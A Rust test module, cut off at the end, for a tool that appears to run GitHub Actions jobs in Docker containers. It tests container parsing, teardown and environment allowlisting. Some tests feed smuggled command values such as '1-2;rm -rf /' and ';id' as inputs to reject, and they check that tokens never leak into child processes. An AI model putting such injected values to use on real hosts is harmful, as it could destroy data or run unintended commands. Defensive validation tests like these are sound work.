    const RUNNER_ID: &str = "7452909c189b0d1d8b51c1a8b0e4d71ab6e6f3e2c3b6e2c1a8b0e4d71ab6e6f3";
    const DIND_ID: &str = "1bf35ccb2103a1d8b51c1a8b0e4d71ab6e6f3e2c3b6e2c1a8b0e4d71ab6e6f3e";

    fn job_row(id: &str, kind: &str, claim: &str, state: &str) -> String {
        serde_json::json!({"ID": id, "Kind": kind, "Claim": claim, "State": state}).to_string()
    }

    #[test]
    fn a_job_container_line_reads_its_claim_kind_and_state() {
        let text = [
            job_row(RUNNER_ID, "runner", "1001-1756000000000", "paused"),
            job_row(DIND_ID, "dind", "1001-1756000000000", "running"),
            // Not a job's runner or dind, or no claim to join it to: not the floor's.
            job_row(RUNNER_ID, "cache", "1001-1756000000000", "running"),
            job_row(RUNNER_ID, "runner", "", "running"),
            "{\"ID\":\"x\"}".to_string(),
        ]
        .join("\n");
        assert_eq!(
            job_containers_from(&text),
            Some(vec![
                JobContainer {
                    id: RUNNER_ID.to_string(),
                    claim: "1001-1756000000000".to_string(),
                    kind: KIND_RUNNER.to_string(),
                    paused: true,
                },
                JobContainer {
                    id: DIND_ID.to_string(),
                    claim: "1001-1756000000000".to_string(),
                    kind: KIND_DIND.to_string(),
                    paused: false,
                },
            ])
        );
    }

    /// #105: the id goes on `docker pause`'s command line and the claim decides
    /// which job is frozen, so neither is taken in any form but faber's own. And
    /// one such row makes the whole listing unreadable, so the floor decides
    /// nothing rather than freeze or thaw a job read one container short.
    #[test]
    fn a_job_container_with_an_id_or_claim_that_is_not_fabers_reads_as_cannot_tell() {
        let claim = "1001-1756000000000";
        let good = job_row(DIND_ID, "dind", claim, "running");
        for row in [
            job_row("7452909c189b", "runner", claim, "running"), // a short id
            job_row("--help", "runner", claim, "running"),
            job_row(&RUNNER_ID.to_uppercase(), "runner", claim, "running"),
            job_row(&format!("{RUNNER_ID};id"), "runner", claim, "running"),
            job_row(RUNNER_ID, "runner", "x-1", "running"),
            job_row(RUNNER_ID, "dind", "1-2;rm -rf /", "running"),
            "not json".to_string(),
        ] {
            assert_eq!(job_containers_from(&row), None, "{row}");
            assert_eq!(
                job_containers_from(&format!("{good}\n{row}")),
                None,
                "beside a good row: {row}"
            );
        }
    }

    // --- ADR-0021 §3: faber's own working set ---------------------------------

    #[test]
    fn the_co_tenant_sampler_asks_for_fabers_containers_by_label() {
        let args = faber_container_ps_args();
        assert!(args.contains(&"label=org.faber.owned=true".to_string()));
        assert!(!args.iter().any(|a| a.starts_with("name=")), "{args:?}");
        // A frozen job still holds its memory.
        assert!(args.contains(&"status=paused".to_string()));
    }

    #[test]
    fn fabers_container_listing_is_read_whole_or_not_at_all() {
        let text = format!("\"{RUNNER_ID}\"\n\n\"{DIND_ID}\"\n");
        assert_eq!(
            faber_container_ids_from(&text),
            Some([RUNNER_ID.to_string(), DIND_ID.to_string()].into())
        );
        assert_eq!(faber_container_ids_from(""), Some(BTreeSet::new()));
        // One row faber cannot read would leave a container of its own out, and
        // charge its memory to the co-tenants for a day.
        for bad in ["\"7452909c189b\"", "not json", "{\"ID\":1}"] {
            assert_eq!(
                faber_container_ids_from(&format!("\"{RUNNER_ID}\"\n{bad}")),
                None,
                "{bad}"
            );
        }
    }

    #[test]
    fn stats_rows_read_by_full_id_and_skip_what_they_cannot() {
        let text = [
            format!(r#"{{"ID":"{RUNNER_ID}","Mem":"1.5GiB / 4GiB"}}"#),
            format!(r#"{{"ID":"{DIND_ID}","Mem":"-- / --"}}"#),
            r#"{"ID":"short","Mem":"9GiB / 9GiB"}"#.to_string(),
            "garbage".to_string(),
        ]
        .join("\n");
        let mem = container_mem_from(&text);
        assert_eq!(mem.len(), 1);
        assert_eq!(mem[RUNNER_ID], 1536);
    }

    #[test]
    fn a_variant_build_marks_the_co_tenant_sample_as_overlapped() {
        // Other tests may build concurrently, so only what this one holds is
        // asserted: while it runs, no mark; once it ends, a later mark than before.
        let building = BuildInFlight::start();
        assert_eq!(build_mark(), None);
        let started = BUILDS_STARTED.load(Ordering::SeqCst);
        drop(building);
        assert!(build_mark().is_none_or(|m| m >= started));
        assert!(started >= 1);
    }

    #[test]
    fn fabers_working_set_takes_each_containers_larger_reading_or_refuses() {
        let ids: BTreeSet<String> = [RUNNER_ID.to_string(), DIND_ID.to_string()].into();
        let first: HashMap<String, u64> =
            [(RUNNER_ID.to_string(), 6000), (DIND_ID.to_string(), 500)].into();
        // The runner freed most of its memory between the two reads: counted at
        // 6000, so what it freed is never charged to the co-tenants.
        let second: HashMap<String, u64> = [(RUNNER_ID.to_string(), 900)].into();
        assert_eq!(faber_working_set(&ids, &first, &second), Some(6500));
        assert_eq!(faber_working_set(&ids, &second, &HashMap::new()), None);
        assert_eq!(
            faber_working_set(&BTreeSet::new(), &first, &second),
            Some(0)
        );
    }

    #[tokio::test]
    async fn pausing_refuses_an_id_that_is_not_a_container_id() {
        // Refused before any `docker` is spawned: there is no daemon in this test.
        for bad in ["--all", "7452909c189b", "a;b"] {
            assert!(pause_container(bad).await.is_err(), "{bad}");
            assert!(unpause_container(bad).await.is_err(), "{bad}");
        }
    }

    #[test]
    fn a_claim_id_is_the_runner_name_without_its_prefix() {
        assert_eq!(claim_id("faber-1001-1756000000000"), "1001-1756000000000");
        // The same id the containers are stamped with.
        assert_eq!(
            Names::for_runner("faber-1001-1756000000000").id,
            claim_id("faber-1001-1756000000000")
        );
        // #94: the instance suffix is part of the claim, so every container name
        // built from it — and the registration rebuilt from those — carries it.
        let n = Names::for_runner("faber-1001-1756000000000-builder");
        assert_eq!(n.id, "1001-1756000000000-builder");
        assert_eq!(n.runner, "faber-runner-1001-1756000000000-builder");
        assert_eq!(n.dind, "faber-dind-1001-1756000000000-builder");
        assert!(crate::untrusted::claim_id(&n.id).is_some());
    }

    #[test]
    fn only_the_runner_carries_the_claim_marks() {
        // dind, the network and the volume are reaped by ownership and never
        // adopted, so widening them would be label creep with no reader.
        let m = marks("dind", "owner/demo", "42-1700");
        assert!(!m.iter().any(|v| v.starts_with("org.faber.reserved-mib")));
        assert!(!m.iter().any(|v| v.starts_with("org.faber.class")));
    }

    use super::*;

    #[test]
    fn a_vanished_runner_is_told_apart_from_a_failed_setup() {
        let lost = anyhow::Error::new(RunnerLost("gone".into())).context("running faber-1-1");
        assert!(runner_was_lost(&lost), "found through a context layer");
        assert!(!runner_was_lost(&anyhow::anyhow!(
            "starting dind faber-dind-1: docker run failed"
        )));
    }

    /// #89: a failed mint is told from any later failure by this marker, and the
    /// chain still carries GitHub's own answer for the audit record.
    #[test]
    fn a_failed_mint_is_marked_and_keeps_githubs_answer() {
        let e = anyhow::Error::new(crate::github::GithubError::Status {
            status: 500,
            url: "https://api.github.com/repos/owner/demo/actions/runners/generate-jitconfig"
                .to_string(),
            body: "{}".to_string(),
        })
        .context(MintFailed);
        assert!(e.downcast_ref::<MintFailed>().is_some());
        assert!(
            format!("{e:#}").starts_with("minting the JIT runner config: unexpected status 500"),
            "{e:#}"
        );
        let later = anyhow::anyhow!("starting dind faber-dind-1-2: docker run failed");
        assert!(later.downcast_ref::<MintFailed>().is_none());
    }

    fn cfg() -> DockerConfig {
        let mut c = DockerConfig::new("ghcr.io/owner/my-runner:latest".to_string());
        c.env.insert(
            "PLAYWRIGHT_BROWSERS_PATH".to_string(),
            "/opt/ms-playwright".to_string(),
        );
        c
    }

    /// ADR-0059 §1, #66: every runner mounts its hook read-only, and faber's
    /// value of the hook variable is the one Docker keeps (the last `-e`),
    /// whatever the profile's `env` says. A profile naming the JIT config's
    /// variable does not reach the argv either.
    #[test]
    fn the_hook_variable_wins_over_a_profile_env() {
        let mut c = cfg();
        c.env.insert(
            crate::job_start::HOOK_ENV.to_string(),
            "/evil.js".to_string(),
        );
        c.env
            .insert(RUNNER_JITCONFIG_ENV.to_string(), "forged".to_string());
        let a = runner_run_args(
            "faber-runner-5-100",
            "n",
            Mounts {
                hook_vol: Some("faber-hook-5-100"),
                ..Default::default()
            },
            &c,
            &ResourceLimits::default(),
            &[],
        );
        let ours = format!(
            "{}={}",
            crate::job_start::HOOK_ENV,
            crate::job_start::hook_path()
        );
        let hook_settings: Vec<&String> = a
            .iter()
            .filter(|s| s.starts_with(crate::job_start::HOOK_ENV))
            .collect();
        assert_eq!(hook_settings, vec![&ours], "{a:?}");
        assert!(!a
            .iter()
            .any(|s| s.contains("/evil.js") || s.contains("forged")));
        assert!(a.windows(2).any(|w| w
            == [
                "-v".to_string(),
                format!("faber-hook-5-100:{}:ro", crate::job_start::HOOK_DIR)
            ]));
        // Last before the image, after every other flag.
        let image = a.len() - 1;
        assert_eq!(a[image], c.image);
        assert_eq!(a[image - 1], ours);
        // The profile's other variables still reach the runner.
        assert!(a
            .iter()
            .any(|s| s == "PLAYWRIGHT_BROWSERS_PATH=/opt/ms-playwright"));
    }

    /// The presence check: a hook is in place only when the fill reports the
    /// size faber wrote.
    #[test]
    fn a_hook_is_in_place_only_at_its_full_size() {
        assert!(hook_in_place("4096\n", 4096).is_ok());
        assert!(hook_in_place("  4096 ", 4096).is_ok());
        assert!(hook_in_place("4000", 4096).is_err());
        assert!(hook_in_place("0", 0).is_err());
        assert!(hook_in_place("", 4096).is_err());
        // The fill writes the file readable by the runner's user, under the
        // directory the runner mounts read-only, and never as a credential.
        let labels = marks(KIND_HOOK, "owner/demo", "5-100");
        let names = Names::for_runner("faber-5-100");
        let f = CredentialFill {
            volume: &names.hook,
            labels: &labels,
            container: &names.hook_fill,
            image: "faber-runner:local",
            dir: crate::job_start::HOOK_DIR,
            file: crate::job_start::HOOK_FILE,
            owner: None,
        };
        let a = fill_args(&f, HOOK_FILL_SCRIPT);
        assert!(a.iter().any(|s| s == "--pull=never"));
        assert!(a.windows(2).any(|w| w == ["--network", "none"]));
        assert!(a.iter().any(|s| s.contains("chmod 0644")));
        assert!(a.iter().any(|s| s == &format!("{LABEL_KIND}={KIND_HOOK}")));
        assert_eq!(names.hook, "faber-hook-5-100");
    }

    #[test]
    fn a_bypass_finds_the_repo_cache_by_label_alone() {
        // ADR-0030 deletes exactly one repo's cache, and AGENTS.md: labels, never
        // names. Both filters must be there, or one repo's bypass takes another's.
        let args = cache_volume_ls_args("owner/demo");
        assert!(args.contains(&format!("label={LABEL_KIND}={KIND_CACHE}")));
        assert!(args.contains(&"label=org.faber.repo=owner/demo".to_string()));
        assert!(!args.iter().any(|a| a.contains("faber-cache-")), "{args:?}");
    }

    #[test]
    fn an_unlabelled_cache_volume_is_reported_never_passed_off_as_clean() {
        let legacy = cache_volume_name("owner/demo");
        let other = format!("{legacy}-x");
        // Labelled one removed, nothing else by that name: clean.
        assert_eq!(
            purge_outcome(
                vec![legacy.clone()],
                std::slice::from_ref(&legacy),
                std::slice::from_ref(&legacy),
                &legacy
            ),
            CachePurge::Removed(vec![legacy.clone()])
        );
        // Nothing at all: clean.
        assert_eq!(
            purge_outcome(vec![], &[], &[], &legacy),
            CachePurge::Removed(vec![])
        );
        // A same-named volume the label listing missed: reported, not deleted.
        assert_eq!(
            purge_outcome(vec![], &[], std::slice::from_ref(&legacy), &legacy),
            CachePurge::Unlabelled {
                removed: vec![],
                name: legacy.clone()
            }
        );
        // The name filter's substring match does not count.
        assert_eq!(
            purge_outcome(vec![], &[], &[other], &legacy),
            CachePurge::Removed(vec![])
        );
        assert!(volume_name_ls_args(&legacy).contains(&format!("name={legacy}")));
    }

    #[test]
    fn a_bypass_kill_reaches_the_dind_whatever_the_runner_did() {
        let names = Names::for_runner("faber-5-100");
        let gone = || {
            Err(
                "docker exited 1: Error response from daemon: container x is not running"
                    .to_string(),
            )
        };
        let broken = || Err("docker exited 1: daemon unreachable".to_string());
        assert!(kill_verdict(&names, Ok(()), Ok(())).is_ok());
        assert!(kill_verdict(&names, gone(), Ok(())).is_ok());
        assert!(kill_verdict(&names, gone(), gone()).is_ok());
        // #66: a runner whose kill failed is still running the refused job, so
        // the dind's kill working does not make the stop done.
        assert!(kill_verdict(&names, broken(), Ok(())).is_err());
        assert!(kill_verdict(&names, Ok(()), broken()).is_ok());
        assert!(kill_verdict(&names, broken(), broken()).is_err());
        assert!(kill_moot("Error: No such container: faber-dind-5-100"));
    }

    #[test]
    fn a_mounted_cache_volume_is_deferred_not_failed() {
        assert!(volume_in_use(
            "docker exited 1: Error response from daemon: remove faber-cache-owner-demo: \
             volume is in use - [abc123]"
        ));
        assert!(!volume_in_use("docker exited 1: permission denied"));
    }

    /// A claim reclaimed while its provisioning ramp is in flight must be noticed
    /// at the next seam, not after the whole ramp — the reservation it holds is
    /// funding a job that no longer needs a runner.
    #[test]
    fn a_reclaim_is_visible_at_the_next_seam() {
        let (tx, rx) = watch::channel(false);
        assert!(!reclaim_pending(&rx), "an unreclaimed claim proceeds");
        tx.send(true).unwrap();
        assert!(reclaim_pending(&rx), "a reclaim must be seen at the seam");
    }

    /// A dropped sender is not a reclaim. `watch` reports a closed channel as an
    /// error, and reading that as "reclaimed" would abandon a perfectly live
    /// provision — the mirror of the [`wait_cancelled`] contract, which pends
    /// forever rather than reporting a phantom cancel.
    #[test]
    fn a_dropped_sender_is_not_a_reclaim() {
        let (tx, rx) = watch::channel(false);
        drop(tx);
        assert!(!reclaim_pending(&rx));
    }

    /// `until_reclaimed` is `biased` for a reason: a claim already reclaimed must
    /// not slip through because its step happened to be ready in the same poll.
    ///
    /// Both arms are ready here, which is exactly the case an unbiased `select!`
    /// resolves by *coin flip* — so one assertion would let that regression through
    /// half the time. Repeating it turns a 50/50 into a certainty.
    #[tokio::test]
    async fn an_already_reclaimed_claim_beats_a_ready_step() {
        for attempt in 0..100 {
            let (tx, mut rx) = watch::channel(false);
            tx.send(true).unwrap();
            let out = until_reclaimed(&mut rx, std::future::ready("finished")).await;
            assert_eq!(
                out, None,
                "the reclaim must win even against a ready step (attempt {attempt})"
            );
        }
    }

    /// The converse: with no reclaim, the step's own result comes back untouched.
    #[tokio::test]
    async fn a_step_that_is_not_reclaimed_returns_its_value() {
        let (_tx, mut rx) = watch::channel(false);
        let out = until_reclaimed(&mut rx, std::future::ready("finished")).await;
        assert_eq!(out, Some("finished"));
    }

    /// And a dropped sender must not cut a step short here either — this is the
    /// call site where reading a closed channel as a cancel would abandon a dind
    /// readiness wait that was about to succeed.
    #[tokio::test]
    async fn a_dropped_sender_does_not_cut_a_step_short() {
        let (tx, mut rx) = watch::channel(false);
        drop(tx);
        let out = until_reclaimed(&mut rx, std::future::ready("finished")).await;
        assert_eq!(out, Some("finished"));
    }

    /// The property the ramp actually depends on: a reclaim arriving *while* a
    /// long step is running cuts it short, rather than being noticed once the step
    /// times out on its own. `wait_for_dind` is the real such step — up to
    /// [`DIND_READY_TIMEOUT`] of polling — so a sleep of that length stands in.
    #[tokio::test]
    async fn a_reclaim_mid_step_cuts_a_long_wait_short() {
        let (tx, mut rx) = watch::channel(false);
        tokio::spawn(async move {
            tokio::time::sleep(Duration::from_millis(50)).await;
            let _ = tx.send(true);
        });
        let started = tokio::time::Instant::now();
        let out = until_reclaimed(&mut rx, tokio::time::sleep(DIND_READY_TIMEOUT)).await;
        assert!(out.is_none(), "the reclaim must win");
        assert!(
            started.elapsed() < Duration::from_secs(5),
            "a mid-step reclaim must not wait the step out, took {:?}",
            started.elapsed()
        );
    }

    /// The regression that abandoned a multi-GB dind volume per teardown: a
    /// removal was bounded by the *metadata* budget, so a `rm -f` deleting a
    /// job's image layers routinely "failed" at 20s while the daemon was still
    /// working, and the volume removal that followed hit `volume is in use`.
    #[test]
    fn teardown_and_launch_get_far_more_budget_than_a_metadata_call() {
        assert!(
            TEARDOWN_TIMEOUT >= CLI_TIMEOUT * 4,
            "a removal that deletes gigabytes of layers must not share the metadata cap \
             ({TEARDOWN_TIMEOUT:?} vs {CLI_TIMEOUT:?})"
        );
        assert!(LAUNCH_TIMEOUT >= CLI_TIMEOUT * 4);
        // Wide, but still bounded — the unbounded hang is the failure mode this
        // whole mechanism exists for.
        assert!(!TEARDOWN_TIMEOUT.is_zero() && !LAUNCH_TIMEOUT.is_zero());
        // The confirm budget only makes sense on top of a removal that already
        // overran, and must itself terminate.
        assert!(!REMOVE_CONFIRM.is_zero() && REMOVE_CONFIRM < TEARDOWN_TIMEOUT);
    }

    #[test]
    fn inspect_absence_only_reads_an_explicit_no_such_as_gone() {
        // Present: the inspect answered.
        assert_eq!(inspect_absence(true, ""), Some(false));
        // Gone: the daemon said so, in either of its wordings.
        assert_eq!(
            inspect_absence(false, "Error: No such container: faber-dind-1"),
            Some(true)
        );
        assert_eq!(inspect_absence(false, "Error: not found"), Some(true));
        // Unknown: a daemon that failed for some other reason must NOT read as
        // "gone", or a confirm would clear a container that is still holding the
        // volume.
        assert_eq!(
            inspect_absence(false, "Cannot connect to the Docker daemon"),
            None
        );
    }

    /// A timed-out `rm -f` is not a failed one: the daemon usually finishes after
    /// the client gives up, so the state has to be re-checked.
    #[tokio::test]
    async fn wait_absent_confirms_a_removal_the_client_gave_up_on() {
        let calls = std::cell::Cell::new(0u32);
        let gone = wait_absent(
            || {
                let n = calls.get() + 1;
                calls.set(n);
                // Still present for the first two probes, then the daemon lands it.
                async move { Some(n >= 3) }
            },
            Duration::from_secs(5),
            Duration::from_millis(1),
        )
        .await;
        assert!(
            gone,
            "an asynchronously-completed removal must read as removed"
        );
        assert_eq!(
            calls.get(),
            3,
            "must stop probing as soon as it is confirmed"
        );
    }

    #[tokio::test]
    async fn wait_absent_gives_up_when_the_container_never_goes() {
        let started = tokio::time::Instant::now();
        let gone = wait_absent(
            || async { Some(false) },
            Duration::from_millis(50),
            Duration::from_millis(1),
        )
        .await;
        assert!(
            !gone,
            "a container that is really still there is a real failure"
        );
        assert!(
            started.elapsed() < Duration::from_secs(5),
            "confirming must be bounded, took {:?}",
            started.elapsed()
        );
    }

    #[tokio::test]
    async fn wait_absent_never_reads_an_unanswered_probe_as_gone() {
        // A wedged daemon answers nothing; treating that as "removed" would send
        // teardown on to a `volume rm` the still-live dind must refuse.
        let gone = wait_absent(
            || async { None },
            Duration::from_millis(50),
            Duration::from_millis(1),
        )
        .await;
        assert!(!gone);
    }

    #[test]
    fn volume_rm_retries_only_an_in_use_refusal() {
        let in_use = "docker exited exit status: 1: Error response from daemon: \
                      remove faber-vol-1: volume is in use - [abc123]";
        // The dind may still be mid-removal — a race to wait out, not a verdict.
        assert!(retry_volume_rm(in_use, 1));
        assert!(retry_volume_rm(in_use, VOLUME_RM_ATTEMPTS - 1));
        // …but bounded: the last attempt reports instead of looping forever.
        assert!(!retry_volume_rm(in_use, VOLUME_RM_ATTEMPTS));
        // Anything else is final; retrying it would just burn the daemon.
        assert!(!retry_volume_rm("no such volume", 1));
        assert!(!retry_volume_rm("docker volume rm exceeded 120s", 1));
    }

    /// Every `docker` spawn runs the program the platform seam names: the
    /// pinned CLI by absolute path on a SYSTEM macOS host
    /// (`platform::docker_cli_for` is tested there), `docker` from `PATH`
    /// under LEGACY, which is what unit tests run.
    #[test]
    fn docker_command_runs_the_platform_s_docker_cli() {
        let cmd = docker_command();
        assert_eq!(
            cmd.as_std().get_program(),
            std::ffi::OsStr::new(crate::platform::docker_cli())
        );
        assert_eq!(cmd.as_std().get_program(), "docker");
    }

    // --- the docker CLI environment allowlist (AGENTS.md/ADR-0025 §8) ------

    #[test]
    fn the_cli_env_predicate_covers_the_allowlist_and_the_docker_prefixes() {
        for k in DOCKER_ENV_ALLOWLIST {
            assert!(docker_cli_env_name(k), "{k}");
        }
        for k in ["DOCKER_FOO", "DOCKER_CONFIG", "BUILDKIT_X", "PATH", "HOME"] {
            assert!(docker_cli_env_name(k), "{k}");
        }
        for k in [
            "REDIS_URL",
            "ROOT_KEY",
            "MY_DOCKER_HOST",
            "POSTGRES_PASSWORD",
        ] {
            assert!(!docker_cli_env_name(k), "{k}");
        }
    }

    #[tokio::test]
    async fn the_cli_child_refuses_an_extra_env_it_reads_itself() {
        for k in ["DOCKER_HOST", "PATH", "DOCKER_X", "BUILDKIT_X", "TMPDIR"] {
            let e = docker_ok_with_env(&["version"], Duration::from_secs(5), &[(k, "x")])
                .await
                .unwrap_err();
            assert!(e.to_string().contains(k), "{e:#}");
        }
    }

    /// `apply_docker_env` — and therefore [`docker_command`] — must clear
    /// whatever the process actually has and copy back only
    /// [`DOCKER_ENV_ALLOWLIST`], from a source the test controls rather than
    /// `std::env::var` itself: injecting a fake parent environment as a
    /// parameter, never `std::env::set_var`, which is unsound in a
    /// multi-threaded test binary (issue #47).
    ///
    /// Spawns `/usr/bin/env` in place of `docker` — a stand-in
    /// for the real binary, so this needs no real `docker` CLI or daemon, and the result is
    /// directly inspectable instead of being another opaque exit code.
    #[tokio::test]
    async fn docker_command_env_allowlist_blocks_everything_not_listed() {
        let parent: &[(&str, &str)] = &[
            ("GH_TOKEN", "gh-secret"),
            ("GITHUB_TOKEN", "gha-secret"),
            ("SSH_AUTH_SOCK", "/tmp/agent.sock"),
            ("PATH", "/usr/bin:/bin"),
            ("LANG", "en_US.UTF-8"),
            ("DOCKER_HOST", "unix:///var/run/docker.sock"),
        ];
        let lookup = |k: &str| {
            parent
                .iter()
                .find(|(name, _)| *name == k)
                .map(|(_, v)| v.to_string())
        };

        let mut cmd = Command::new("/usr/bin/env");
        apply_docker_env(&mut cmd, lookup, None);
        let out = cmd.output().await.expect("spawning /usr/bin/env");
        assert!(out.status.success());
        let stdout = String::from_utf8_lossy(&out.stdout);

        for secret in ["GH_TOKEN", "GITHUB_TOKEN", "SSH_AUTH_SOCK"] {
            assert!(
                !stdout.contains(secret),
                "{secret} must never reach a docker child's environment: {stdout:?}"
            );
        }
        assert!(stdout.contains("PATH=/usr/bin:/bin"));
        assert!(stdout.contains("LANG=en_US.UTF-8"));
        assert!(stdout.contains("DOCKER_HOST=unix:///var/run/docker.sock"));
        // Strong enough to catch a dropped `env_clear()`: without it, `env` would
        // print this whole test process's real environment (dozens of lines),
        // not just the three allowlisted-and-set variables above.
        assert_eq!(
            stdout.lines().count(),
            3,
            "only the allowlisted, present variables may appear: {stdout:?}"
        );
    }

    /// A variable that faber's own process never set at all — as opposed to one
    /// the lookup withheld — must stay absent too: an allowlisted *name* with no
    /// value is not an opening.
    #[tokio::test]
    async fn docker_command_env_allowlist_omits_an_unset_allowlisted_var() {
        let mut cmd = Command::new("/usr/bin/env");
        apply_docker_env(&mut cmd, |_| None, None);
        let out = cmd.output().await.expect("spawning /usr/bin/env");
        assert!(out.status.success());
        assert_eq!(
            String::from_utf8_lossy(&out.stdout),
            "",
            "nothing was set, so the child must see an empty environment"
        );
    }

    /// Where faber has its own Docker socket (ADR-0026), `DOCKER_HOST` names it
    /// whatever the parent says, and `DOCKER_CONTEXT` never reaches the child:
    /// nothing in faber's environment can point a `docker` call at Docker
    /// Desktop. The rest of the allowlist is copied as before.
    #[tokio::test]
    async fn docker_command_env_pins_faber_s_own_socket_when_it_has_one() {
        let parent: &[(&str, &str)] = &[
            ("PATH", "/usr/bin:/bin"),
            ("DOCKER_HOST", "unix:///var/run/docker.sock"),
            ("DOCKER_CONTEXT", "desktop-linux"),
            ("GH_TOKEN", "gh-secret"),
        ];
        let lookup = |k: &str| {
            parent
                .iter()
                .find(|(name, _)| *name == k)
                .map(|(_, v)| v.to_string())
        };
        let sock = std::path::Path::new("/var/db/faber-vm/run/docker.sock");
        let mut cmd = Command::new("/usr/bin/env");
        apply_docker_env(&mut cmd, lookup, Some(sock));
        let out = cmd.output().await.expect("spawning /usr/bin/env");
        assert!(out.status.success());
        let stdout = String::from_utf8_lossy(&out.stdout);
        let mut lines: Vec<&str> = stdout.lines().collect();
        lines.sort();
        assert_eq!(
            lines,
            [
                "DOCKER_HOST=unix:///var/db/faber-vm/run/docker.sock",
                "PATH=/usr/bin:/bin"
            ],
            "{stdout:?}"
        );
        // Unit tests run LEGACY: no endpoint, so DOCKER_HOST passes through.
        assert_eq!(docker_endpoint(), None);
    }

    #[test]
    fn names_derive_from_job_id() {
        let n = Names::for_runner("faber-1001");
        assert_eq!(n.net, "faber-net-1001");
        assert_eq!(n.dind, "faber-dind-1001");
        assert_eq!(n.runner, "faber-runner-1001");
        assert_eq!(n.vol, "faber-vol-1001");
    }

    #[test]
    fn dind_run_args_alias_dind_and_disable_tls() {
        let a = dind_run_args(
            "faber-dind-1",
            "faber-net-1",
            "faber-vol-1",
            "docker:dind",
            &ResourceLimits::default(),
            &[],
        );
        assert!(a.windows(2).any(|w| w == ["--network-alias", "dind"]));
        assert!(a.windows(2).any(|w| w == ["-e", "DOCKER_TLS_CERTDIR="]));
        assert!(a.contains(&"--privileged".to_string()));
        // The dind state volume must be named, or it leaks on removal.
        assert!(a
            .windows(2)
            .any(|w| w == ["-v", "faber-vol-1:/var/lib/docker"]));
        // dockerd args must follow the image; --tls=false avoids the insecure-bind
        // startup penalty.
        let img = a.iter().position(|s| s == "docker:dind").unwrap();
        assert_eq!(a[img + 1], "--tls=false");
        assert_eq!(a.last().unwrap(), "--tls=false");
        // No ceilings set → no resource flags at all.
        assert!(!a.iter().any(|s| s == "--cpus" || s == "--memory"));
    }

    #[test]
    fn password_env_must_live_in_the_faber_registry_namespace() {
        for ok in [
            "FABER_REGISTRY_PASSWORD",
            "FABER_REGISTRY_GHCR_2",
            "  FABER_REGISTRY_X  ",
            "",
        ] {
            assert_eq!(password_env_problem(ok), None, "{ok:?}");
        }
        for bad in [
            "GITHUB_TOKEN",
            "OTHER_SECRET",
            "FABER_REGISTRY_",
            "FABER_REGISTRYX",
            "faber_registry_x",
            "FABER_REGISTRY_a",
            "FABER_REGISTRY_A B",
            "FABER_REGISTRY_A=B",
            "FABER_GITHUB_TOKEN",
        ] {
            let why = password_env_problem(bad).unwrap_or_else(|| panic!("{bad:?} accepted"));
            assert!(why.contains("FABER_REGISTRY_"), "{why}");
        }
    }

    #[test]
    fn a_held_registry_auth_reaches_no_runner() {
        // `[registry_auth]` is held (see [`RegistryAuth`]): a daemon that boots
        // with it on must not hand the job a credential in any form. The resolved
        // profile carries none of the section — not the switch, not the account,
        // not the variable's name — and the runner's argv has no credential mount
        // and no `DOCKER_CONFIG`.
        let file: crate::config::FileConfig = toml::from_str(
            r#"
            [registry_auth]
            enabled = true
            username = "someone"
            password_env = "FABER_REGISTRY_HELD_SECRET"

            [[profile]]
            name = "linux-docker"
            labels = ["faber", "docker"]
            backend = "docker"
            image = "ghcr.io/owner/my-runner:latest"
        "#,
        )
        .unwrap();
        assert!(file.registry_auth.enabled, "the section still parses");
        let profiles = file
            .into_profiles("2.330.0")
            .expect("a held section still boots");
        let crate::backend::Backend::Docker(d) = &profiles[0].backend else {
            panic!("expected docker backend");
        };
        let shown = format!("{d:?}");
        for held in ["registry", "someone", "FABER_REGISTRY_HELD_SECRET"] {
            assert!(
                !shown.contains(held),
                "the profile carries {held:?}: {shown}"
            );
        }
        let a = runner_run_args(
            "faber-runner-1-1",
            "faber-net-1-1",
            Mounts::default(),
            d,
            &ResourceLimits::default(),
            &[],
        );
        assert!(!a.iter().any(|s| s.contains("DOCKER_CONFIG")), "{a:?}");
        assert!(!a.iter().any(|s| s.contains(KIND_REGISTRY_AUTH)), "{a:?}");
        assert!(!a.iter().any(|s| s == "-v"), "nothing is mounted: {a:?}");
    }

    #[test]
    fn runner_run_args_carry_jit_dockerhost_and_env() {
        let a = runner_run_args(
            "faber-runner-1",
            "faber-net-1",
            Mounts::default(),
            &cfg(),
            &ResourceLimits::default(),
            &[],
        );
        assert!(a
            .windows(2)
            .any(|w| w == ["-e", "DOCKER_HOST=tcp://dind:2375"]));
        // Name only, deliberately never a value — the JIT config travels in the
        // spawned `docker` CLI child's own environment instead (docker.rs
        // `run_in_sandbox`), so `ps` never shows it.
        assert!(a.windows(2).any(|w| w == ["-e", RUNNER_JITCONFIG_ENV]));
        assert!(!a.iter().any(|s| s.starts_with("RUNNER_JITCONFIG=")));
        assert!(a
            .iter()
            .any(|s| s == "PLAYWRIGHT_BROWSERS_PATH=/opt/ms-playwright"));
        // The image is always the final positional argument.
        assert_eq!(a.last().unwrap(), "ghcr.io/owner/my-runner:latest");
        // No `--rm`: the container must survive its exit for the OOM inspect.
        assert!(!a.contains(&"--rm".to_string()));
        // ADR-0011, and a regression guard for a bug this cost a live restart to
        // find: attached, `docker run` proxies signals into the container, so
        // launchd signalling faber's process group killed adopted runners (exit
        // 143) seconds after a clean handoff. Detached, faber's lifetime cannot
        // reach the container at all.
        assert!(
            a.contains(&"-d".to_string()),
            "the runner must be detached or faber's own exit kills it"
        );
        // Default (unlimited) emits no ceiling flags — unchanged behavior.
        assert!(!a.iter().any(|s| s == "--cpus" || s == "--memory"));
        // #156: a runner starts only from a local image. Without this a deleted
        // local-only `owner/x` tag was fetched from Docker Hub's `owner`.
        assert!(a.contains(&"--pull=never".to_string()));
    }

    /// The other half of the JIT-off-argv change: the value really does reach
    /// the launched child's environment, not just "is absent from argv" (the
    /// previous test). Exercises the same `apply_docker_env` seam the allowlist
    /// tests above use, with `/usr/bin/env` standing in for `docker` so this
    /// needs no live daemon.
    #[tokio::test]
    async fn jit_config_reaches_the_child_env_not_argv() {
        let argv = runner_run_args(
            "faber-runner-1",
            "faber-net-1",
            Mounts::default(),
            &cfg(),
            &ResourceLimits::default(),
            &[],
        );
        assert!(!argv.iter().any(|s| s.contains("JITBLOB")));

        let mut cmd = Command::new("/usr/bin/env");
        apply_docker_env(&mut cmd, |_| None, None);
        cmd.env(RUNNER_JITCONFIG_ENV, "JITBLOB");
        let out = cmd.output().await.expect("spawning /usr/bin/env");
        assert_eq!(
            String::from_utf8_lossy(&out.stdout).trim(),
            "RUNNER_JITCONFIG=JITBLOB",
            "the JIT config must reach the child's environment under the same name argv names"
        );
    }

    /// The other half of the chain the test above checks: faber's own side
